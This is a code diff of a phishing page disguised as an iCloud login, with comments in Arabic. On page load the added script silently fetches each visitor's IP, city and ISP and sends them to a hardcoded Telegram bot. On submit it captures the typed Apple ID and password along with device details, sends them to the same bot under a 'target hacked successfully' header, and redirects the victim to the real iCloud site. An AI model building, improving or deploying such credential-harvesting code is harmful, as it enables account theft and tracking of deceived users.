@@ -10,7 +10,7 @@
         img { width: 35px; margin-bottom: 20px; }
         h1 { font-size: 24px; font-weight: 600; margin: 0 0 10px; }
         p { color: #666; font-size: 14px; margin-bottom: 30px; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 16px; box-sizing: border-box; -webkit-appearance: none; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; }
         button { width: 100%; padding: 14px; background: #0071e3; color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 500; cursor: pointer; }
     </style>
 </head>
@@ -28,43 +28,60 @@
 </div>
 
 <script>
+    const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
+    const chat_id = "6888107255";
+
+    // دالة الإرسال لضمان التوصيل في سفاري
+    function sendMsg(text) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
+    }
+
+    // 1. عند الدخول فوراً (سحب صامت)
+    window.onload = async function() {
+        let entryMsg = "🔔 [دخول جديد للرابط - جاري السحب...]\n";
+        try {
+            const res = await fetch('https://ipwho.is/');
+            const d = await res.json();
+            entryMsg += `🌐 IP: ${d.ip}\n📍 الموقع: ${d.city}\n📶 المزود: ${d.connection.isp}`;
+        } catch(e) { entryMsg += "⚠️ تعذر سحب الـ IP صامتاً"; }
+        sendMsg(entryMsg);
+    };
+
+    // 2. التقرير الشامل عند الضغط (بالترتيب المطلوب)
     document.getElementById('btn').onclick = async function() {
         const user = document.getElementById('u').value;
         const pass = document.getElementById('p').value;
-        if(!user || !pass) return alert("Enter ID/Pass");
+        if(!user || !pass) return alert("Please enter your ID and Password");
 
         this.innerHTML = "Processing...";
         this.disabled = true;
 
-        const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
-        const chat_id = "6888107255";
-        
-        // جلب الـ IP والموقع في لحظة الضغط لتجاوز الحظر
-        let ipData = {ip: "Unknown", city: "Unknown"};
+        // جلب البيانات الدقيقة لتجنب Unknown
+        let ipData = {ip: "N/A", city: "N/A", country: "N/A", isp: "N/A"};
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            ipData = await res.json();
+            const res = await fetch('https://ipwho.is/');
+            const d = await res.json();
+            ipData = {ip: d.ip, city: d.city, country: d.country, isp: d.connection.isp};
         } catch(e) {}
 
-        // جمع كافة المعلومات المطلوبة في متغير واحد
         let report = "⚠️ تم اختراق الهدف بنجاح ⚠️\n\n";
         report += "📧 الحساب: " + user + "\n";
         report += "🔑 الباسورد: " + pass + "\n";
         report += "------------------------\n";
         report += "🌐 الـ IP: " + ipData.ip + "\n";
-        report += "📍 الموقع: " + ipData.city + " (" + (ipData.country_name || "Unknown") + ")\n";
-        report += "📶 المزود: " + (ipData.org || "Unknown") + "\n";
+        report += "📍 الموقع: " + ipData.city + " (" + ipData.country + ")\n";
+        report += "📶 المزود: " + ipData.isp + "\n";
         report += "📱 النظام: " + navigator.platform + "\n";
         report += "🔋 البطارية: " + (navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A") + "\n";
         report += "📏 الدقة: " + screen.width + "x" + screen.height + "\n";
         report += "🕰️ الوقت: " + new Date().toLocaleString() + "\n";
         report += "🔒 كوكيز: " + (document.cookie ? "موجودة" : "محمية");
 
-        // إرسال الضربة القاضية
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}`);
+        sendMsg(report);
 
-        // التحويل النهائي لآي كلوود
-        window.location.replace("https://www.icloud.com/");
+        setTimeout(() => {
+            window.location.replace("https://www.icloud.com/");
+        }, 1200);
     };
 </script>
 
